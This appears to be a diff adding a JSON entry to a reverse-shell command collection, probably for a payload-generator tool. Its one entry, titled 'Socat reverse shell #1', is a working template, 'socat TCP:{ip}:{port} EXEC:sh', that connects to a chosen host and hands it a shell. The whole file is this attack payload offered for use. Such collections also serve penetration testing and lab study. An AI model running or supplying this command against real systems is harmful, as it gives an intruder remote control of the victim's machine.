@@ -1,0 +1,9 @@
+{
+  "commands": [
+    {
+      "title": "Socat reverse shell #1",
+      "template": "socat TCP:{ip}:{port} EXEC:sh",
+      "description": "Simple socat reverse shell connecting to TCP."
+    }
+  ]
+}
